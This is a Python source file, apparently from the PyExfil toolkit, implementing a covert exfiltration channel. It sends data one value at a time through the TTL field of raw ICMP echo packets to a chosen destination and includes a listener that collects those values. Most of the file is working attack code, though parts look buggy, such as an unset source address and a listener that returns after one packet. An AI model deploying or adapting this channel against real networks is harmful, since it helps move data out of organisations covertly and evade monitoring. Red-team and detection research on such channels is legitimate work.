
import os
import sys
import time
import array
import struct
import socket

from pyexfil.includes.encryption_wrappers import AESDecryptOFB, AESEncryptOFB
from pyexfil.includes.general import _icmp_checksum


MAX_LENGTH              = 128
DEFAULT_PACKET_SIZE     = 64
DEFAULT_TIMEOUT         = 4
ICMP_ECHO_REQUEST_CODE  = 8
ICMP_DEFAULT_TTL		= 12
ICMP_ID                 = os.getpid() & 0xEEEE
SKIDDIE_PROTECTION      = "Use this for good"
DEFAULT_SEQ_SKIDDIE     = 128


class ICMP_TTL:
	def __init__(self, key, dst_addr):
		self.key = key
		self.dst_addr = dst_addr

	def _sendPing(self, seq=DEFAULT_SEQ_SKIDDIE, ttl=ICMP_DEFAULT_TTL, timeout=DEFAULT_TIMEOUT, packetsize=DEFAULT_PACKET_SIZE):
		ICMP_LEN_BYTES = packetsize
		socket.setdefaulttimeout(timeout)
		icmp = socket.getprotobyname('icmp')
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
		except:
			sys.stderr.write("You must be root to use raw_sockets.\n")
			return False
		
		header = struct.pack("bbHHh", ICMP_ECHO_REQUEST_CODE, 0, 0, ICMP_ID, seq)
		bytesInDouble = struct.calcsize("d")
		data = "%s%s" % (SKIDDIE_PROTECTION, (ICMP_LEN_BYTES - len(SKIDDIE_PROTECTION) - bytesInDouble) * "S")
		data = struct.pack("d", time.time()) + data
		real_checksum = _icmp_checksum("%s%s" % (header, data))
		header = struct.pack("bbHHh", ICMP_ECHO_REQUEST_CODE, 0, socket.htons(real_checksum), ICMP_ID, seq)
		packet = header + data
		sock.sendto(packet, (self.dst_addr, 0))
		return True
			
	def Run(self, data):
		# Confirm that data is not bigger than 255 and that it is an int
		if data <= 255 and isinstance(data, int):
			test = self._sendPing(ttl=data)
			if test:
				return True
			else:
				sys.stderr.write("Unknown error occured and was not able to send out the message.\n")
		
		else:
			return False

	def Listen(self):

		# Start listening for incoming ICMP packets using socket listener
		sock 			= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
		sock.bind((self.src_addr, 0))

		data_in = []

		while True:
			try:
				data, addr = sock.recvfrom(MAX_LENGTH)
				# is packet an ICMP?
				if data[20] == 8 and len(data) >= 28:
					seq = struct.unpack("!H", data[26:28])[0]
					ttl = data[8]
					sys.stdout.write(f'ICMP packet from {addr} with sequence number {seq}, ttl value of {ttl}.\n')
					data_in.append([addr, ttl, seq])
					# Return True if we received the ICMP message, otherwise return False
				return True
			except KeyboardInterrupt:
				sys.stdout.write(f'Got Ctrl+C.\n')
				sock.close()

				sys.stdout.write("Data recieved:\n")
				for addr, data, seq in data_in:
					print(data)
				return True



